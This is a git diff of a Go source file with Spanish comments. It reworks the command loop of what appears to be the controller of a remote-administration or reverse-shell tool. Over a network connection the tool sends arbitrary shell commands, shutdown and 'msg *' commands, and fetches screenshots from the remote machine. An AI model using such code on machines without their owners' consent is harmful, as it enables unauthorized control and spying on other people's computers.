@@ -86,56 +86,54 @@ func Borrar_consola(comando []string) error {
 
 // funcion cuyo proposito es la ejecucion de comandos
 func Comando(conexiones net.Conn) error {
-	var reconectar = errors.New("reconexion") // error que fuerza la recnexion
-	for {
+	// error que fuerza la recnexion para evitar problemas de desincronizacion con el host
+	var reconectar = errors.New("reconexion")
 
-		println(color.Violeta + INSTRUCCION + color.Reset)
-		entrada := input.Input("[#] comando >> ")
-		switch entrada {
-		case "0": // borrar consola
-			sisOP := Sistema()
-			if sisOP != nil {
-				error := Borrar_consola(sisOP)
-				if error != nil {
-					return error
-				}
-			} else {
-				fmt.Println("hubo un problema al intentar borrar la consola")
-			}
-
-		case "1": // apagar equipo
-			err := envio(conexiones, "shutdown /s")
-			if err != nil {
-				return err
-			}
-		case "2": // automatizacion de msg para ciertas ediciones de windows
-
-			mensaje := input.Input("mensaje >> ")
-			msg_format := fmt.Sprintf("msg * %s", mensaje)
-			envio(conexiones, msg_format)
-			return reconectar
-
-		case "q":
-			fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
-			conexiones.Close()
-			os.Exit(0)
-		case "ss":
-			byte_img, error := ss.Obtener_img(conexiones)
+	println(color.Violeta + INSTRUCCION + color.Reset)
+	entrada := input.Input("[#] comando >> ")
+	switch entrada {
+	case "0": // borrar consola
+		sisOP := Sistema()
+		if sisOP != nil {
+			error := Borrar_consola(sisOP)
 			if error != nil {
-				return errors.New("[!] error al obtener la imagen")
+				return error
 			}
-			nombre := input.Input("[*] nombre del png (sin extension)>> ")
-			ss.Escribir_img(byte_img, nombre)
-			return reconectar
+		} else {
+			fmt.Println("hubo un problema al intentar borrar la consola")
+		}
 
-		default:
-			err := envio(conexiones, entrada)
-			if err != nil {
-				return err
-			}
-			continue
+	case "1": // apagar equipo
+		err := envio(conexiones, "shutdown /s")
+		if err != nil {
+			return err
+		}
+	case "2": // automatizacion de msg para ciertas ediciones de windows
 
+		mensaje := input.Input("mensaje >> ")
+		msg_format := fmt.Sprintf("msg * %s", mensaje)
+		envio(conexiones, msg_format)
+
+	case "q":
+		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
+		conexiones.Close()
+		os.Exit(0)
+	case "ss":
+		byte_img, error := ss.Obtener_img(conexiones)
+		if error != nil {
+			return errors.New("[!] error al obtener la imagen")
+		}
+		nombre := input.Input("[*] nombre del png (sin extension)>> ")
+		ss.Escribir_img(byte_img, nombre)
+
+	default:
+		err := envio(conexiones, entrada)
+		if err != nil {
+			return err
 		}
 
 	}
+	input.Input("[+] presione ENTER para continuar ...")
+	return reconectar
+
 }
